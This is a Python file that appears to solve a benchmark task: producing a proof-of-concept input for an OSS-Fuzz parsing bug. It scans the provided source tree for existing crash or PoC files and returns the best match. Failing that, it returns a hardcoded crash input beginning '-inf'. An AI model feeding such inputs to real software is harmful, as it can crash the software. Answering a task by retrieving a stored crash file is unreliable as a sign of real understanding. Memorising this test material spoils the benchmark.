import os
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._find_poc(src_path)
        if data is not None and isinstance(data, (bytes, bytearray)) and len(data) > 0:
            return bytes(data)
        # Fallback PoC based on vulnerability description: leading '-' and non-infinity text
        return b"-infAAAAAAAAAAAA"

    def _find_poc(self, src_path: str):
        if os.path.isdir(src_path):
            return self._find_poc_in_dir(src_path)
        else:
            return self._find_poc_in_tar(src_path)

    def _find_poc_in_tar(self, tar_path: str):
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                best_data = None
                best_score = -1
                for member in tf.getmembers():
                    if not member.isreg():
                        continue
                    size = member.size
                    if size <= 0 or size > 4096:
                        continue
                    base = os.path.basename(member.name).lower()
                    score = self._score_name_and_size(base, size)
                    if score < 15:
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    try:
                        content = f.read()
                    except Exception:
                        continue
                    if not content:
                        continue
                    score += self._score_content(content)
                    if score > best_score:
                        best_score = score
                        best_data = content
                return best_data
        except Exception:
            return None

    def _find_poc_in_dir(self, root: str):
        best_data = None
        best_score = -1
        for dirpath, _, filenames in os.walk(root):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue
                if size <= 0 or size > 4096:
                    continue
                base = name.lower()
                score = self._score_name_and_size(base, size)
                if score < 15:
                    continue
                try:
                    with open(path, "rb") as f:
                        content = f.read()
                except Exception:
                    continue
                if not content:
                    continue
                score += self._score_content(content)
                if score > best_score:
                    best_score = score
                    best_data = content
        return best_data

    def _score_name_and_size(self, name: str, size: int) -> int:
        score = 0
        if "42534949" in name:
            score += 80
        if "oss-fuzz" in name or "ossfuzz" in name:
            score += 30
        if "poc" in name:
            score += 50
        if "crash" in name:
            score += 40
        if "testcase" in name or "test_case" in name:
            score += 25
        if "fuzz" in name:
            score += 20
        if "test" in name:
            score += 10
        if name.endswith((".bin", ".raw", ".dat", ".in", ".txt", ".poc")):
            score += 5
        if size == 16:
            score += 5
        elif size < 64:
            score += 5
        return score

    def _score_content(self, content: bytes) -> int:
        score = 0
        if content and content[:1] == b"-":
            score += 20
        low = content.lower()
        if b"inf" in low or b"infinity" in low:
            score += 20
        return score